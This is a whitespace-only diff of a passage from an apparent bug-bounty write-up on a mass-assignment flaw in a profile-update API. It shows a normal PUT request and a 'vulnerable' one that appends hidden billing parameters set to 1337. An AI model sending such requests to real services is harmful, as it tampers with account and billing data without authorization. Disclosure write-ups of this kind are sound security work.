@@ -63,28 +63,28 @@ The website has a “profile update” function, we can add our potential vulner
 
 
 **Normal REQUEST:**
-PUT /api/users/752902 HTTP/1.1
-Host: PRIVATE-PROGRAM
-Accept: application/json, text/javascript, */*; q=0.01
-Content-Type: application/x-www-form-urlencoded
-X-Requested-With: XMLHttpRequest
-Content-Length: 316
-Cookie: *redacted*
-
+PUT /api/users/752902 HTTP/1.1  
+Host: PRIVATE-PROGRAM  
+Accept: application/json, text/javascript, */*; q=0.01  
+Content-Type: application/x-www-form-urlencoded  
+X-Requested-With: XMLHttpRequest  
+Content-Length: 316  
+Cookie: *redacted*  
+  
 first_name=hacker&last_name=hacker&location=...&tags=...&custom_field_values=...&email=samet%40wearehackerone.com&license_type=licensed 
 
 
 Adding our potential vulnerable parameters to the request
 
 **Vulnerable REQUEST:**
-PUT /api/users/752902 HTTP/1.1
-Host: PRIVATE-PROGRAM
-Accept: application/json, text/javascript, */*; q=0.01
-Content-Type: application/x-www-form-urlencoded
-X-Requested-With: XMLHttpRequest
-Content-Length: 316
-Cookie: *redacted*
-
+PUT /api/users/752902 HTTP/1.1  
+Host: PRIVATE-PROGRAM  
+Accept: application/json, text/javascript, */*; q=0.01  
+Content-Type: application/x-www-form-urlencoded  
+X-Requested-With: XMLHttpRequest  
+Content-Length: 316  
+Cookie: *redacted*  
+  
 first_name=hacker&last_name=hacker&location=...&tags=...&custom_field_values=...&email=samet%40wearehackerone.com&license_type=licensed &**billability_target=1337&billrate=1337**
 
 
